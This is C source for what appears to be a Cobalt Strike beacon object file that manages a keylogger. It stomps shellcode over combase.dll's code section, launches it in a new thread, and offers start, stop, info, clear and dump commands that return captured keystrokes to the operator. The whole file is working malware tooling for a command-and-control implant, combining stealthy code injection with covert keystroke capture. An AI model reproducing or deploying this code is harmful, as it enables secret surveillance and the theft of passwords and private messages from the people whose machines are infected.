#include <beacon.h>
#include <Bof.h>
#include <Native.h>
#include "../../bin/shellcode.c"

VOID set(
    PVOID Out,
    BYTE  In,
    ULONG Size
) {
    for ( int i = 0 ; i < Size ; i++ ) {
        ( ( PBYTE ) Out )[ i ] = In;
    }
}

VOID MmCopy(
    PVOID Out,
    PVOID In,
    ULONG Size
) {
    for ( ULONG Cnt = 0 ; Cnt < Size ; Cnt++ ) {
        ( ( PBYTE ) Out )[ Cnt ] = ( ( PBYTE ) In )[ Cnt ];
    }
}

int StringCompareA( char *str1, char *str2 ) {
    do {
        if ( *str1 != *str2 ) return FALSE;
    } while ( *( ++str1 ) && *( ++str2 ) );

    if ( ! *str1 ) str2++;

    return *str1 == *str2;
}

PINSTANCE find_instance() {
    PINSTANCE Instance = { 0 };
    ULONG     Context  = { 0 };

    for ( int i = 0 ; i < NtCurrentPeb()->NumberOfHeaps ; i++ ) {
        Context = ( ( PINSTANCE ) ( NtCurrentPeb()->ProcessHeaps[ i ] ) )->Context;

        if ( Context == 0xc0debabe ) {
            Instance = NtCurrentPeb()->ProcessHeaps[ i ];
            break;
        }
    }

    return Instance;
}

void start() {
    PVOID     Module        = { 0 };
    HANDLE    Thread        = { 0 };
    ULONG     OldProtection = { 0 };
    PINSTANCE Instance      = find_instance();

    if ( Instance && Instance->Keylogger.ThreadId ) {
        BeaconPrintf( CALLBACK_ERROR, "The keylogger is already running" );
        return;
    }

    if ( ! ( Module = KERNEL32$LoadLibraryA( "combase.dll" ) ) ) {
        BeaconPrintf( CALLBACK_ERROR, "LoadLibraryA failed with error %d", NtLastError() );
        return;
    }

    //
    // .text section is located at around ~0x1000 bytes from the base address
    //
    Module += 0x1000;

    //
    // change the permissions of the page
    //
    if ( ! KERNEL32$VirtualProtect( Module, sizeof( shellcode ), PAGE_READWRITE, &OldProtection ) ) {
        BeaconPrintf( CALLBACK_ERROR, "VirtualProtect failed with error %d", NtLastError() );
        return;
    }

    //
    // copy the payload to the entrypoint
    //
    MmCopy( Module, shellcode, sizeof( shellcode ) );

    //
    // empty the payload
    //
    memset( shellcode, 0, sizeof( shellcode ) );

    //
    // restore the permissions of the page
    //
    if ( ! KERNEL32$VirtualProtect( Module, sizeof( shellcode ), OldProtection, &OldProtection ) ) {
        BeaconPrintf( CALLBACK_ERROR, "VirtualProtect failed with error %d", NtLastError() );
        return;
    }

    //
    // execute in a new thread
    //
    if ( ! ( Thread = KERNEL32$CreateThread( NULL, 0, Module, NULL, 0, NULL ) ) ) {
        BeaconPrintf( CALLBACK_ERROR, "CreateThread failed with error %d", NtLastError() );
        return;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "Started the keylogger!" );

    //KERNEL32$WaitForSingleObject( Thread, INFINITE );
}

void info() {
    PINSTANCE Instance = find_instance();
    //
    // get the keylogger struct through its instance
    //
    if ( ! Instance ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to find the keylogger instance" );
        return;
    }

    BeaconPrintf(
        CALLBACK_OUTPUT,
        "=> Running             : %s\n=> Thread Id           : %d\n=> Language            : %s\n=> Keyboard DLL        : %s\n=> Recorded keystrokes : %d\n",
        Instance->Keylogger.ThreadId ? "true" : "false",
        Instance->Keylogger.ThreadId,
        Instance->Keylogger.KbLang,
        Instance->Keylogger.KbDll,
        Instance->Keylogger.Count
    );
}

void stop() {
    HANDLE    Thread   = { 0 };
    PINSTANCE Instance = find_instance();

    //
    // get the keylogger struct through its instance
    //
    if ( ! Instance ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to find the keylogger instance" );
        return;
    }

    //
    // check it is running
    //
    if ( ! Instance->Keylogger.ThreadId ) {
        BeaconPrintf( CALLBACK_ERROR, "The keylogger is not running" );
        return;
    }

    //
    // unhook the window
    //
    USER32$UnhookWindowsHookEx( Instance->Keylogger.Hook );

    //
    // get a handle onto the thread
    //
    if ( ! ( Thread = KERNEL32$OpenThread( THREAD_TERMINATE, FALSE, Instance->Keylogger.ThreadId ) ) ) {
        BeaconPrintf( CALLBACK_ERROR, "OpenThread failed with error %d", NtLastError() );
    }

    //
    // terminate the thread
    //
    KERNEL32$TerminateThread( Thread, 0 );

    //
    // set the keylogger as not running
    //
    Instance->Keylogger.ThreadId = 0;

    BeaconPrintf( CALLBACK_OUTPUT, "Stopped the keylogger" );
}

VOID clear() {
    PINSTANCE   Instance   = find_instance();
    PKEYSTROKES Keystrokes = { 0 };
    PKEYSTROKES Previous   = { 0 };

    if ( ! Instance ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to find the keylogger instance" );
        return;
    }

    Keystrokes = Instance->Keylogger.Keystrokes;

    //
    // free all keystrokes
    //
    if ( Keystrokes ) {
        //
        // get the last keystrokes structure
        //
        do {
            if ( Previous ) {
                NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, Previous );
            }

            //
            // free the buffer
            //
            NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, Keystrokes->Keys.Buffer );

            //
            // save the current buffer as the previous
            //
            Previous = Keystrokes;
        } while ( Keystrokes->Next && ( Keystrokes = Keystrokes->Next ) );

        //
        // free the last one
        //
        NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, Keystrokes );
    }

    Instance->Keylogger.Keystrokes = NULL;
    Instance->Keylogger.Count      = 0;

    BeaconPrintf( CALLBACK_OUTPUT, "Cleared recorded keystrokes" );
}

VOID dump() {
    PINSTANCE   Instance   = find_instance();
    PKEYSTROKES Keystrokes = { 0 };
    //
    // get the keylogger struct through its instance
    //
    if ( ! Instance ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to find the keylogger instance" );
        return;
    }

    Keystrokes = Instance->Keylogger.Keystrokes;

    //
    // dump keystrokes
    //
    if ( Keystrokes ) {
        //
        // loop through all keystrokes structure
        //
        do {
            if ( Keystrokes->Keys.Buffer ) {
                BeaconPrintf( CALLBACK_OUTPUT, "%ls", Keystrokes->Keys.Buffer );
            }
        } while ( Keystrokes->Next && ( Keystrokes = Keystrokes->Next ) );
    }
}

VOID go(
    IN PCHAR args,
    IN ULONG argc
) {
    datap parser     = { 0 };
    INT   commandLen = { 0 };
    PSTR  command    = { 0 };

    BeaconDataParse( &parser, args, argc );

    command = BeaconDataExtract( &parser, &commandLen );

    if ( StringCompareA( command, "start" ) ) {
        start();
    } else if ( StringCompareA( command, "stop" ) ) {
        stop();
    } else if ( StringCompareA( command, "dump" ) ) {
        dump();
    } else if ( StringCompareA( command, "info" ) ) {
        info();
    } else if ( StringCompareA( command, "clear" ) ) {
        clear();
    } else {
        BeaconPrintf( CALLBACK_ERROR, "Invalid command" );
    }
}
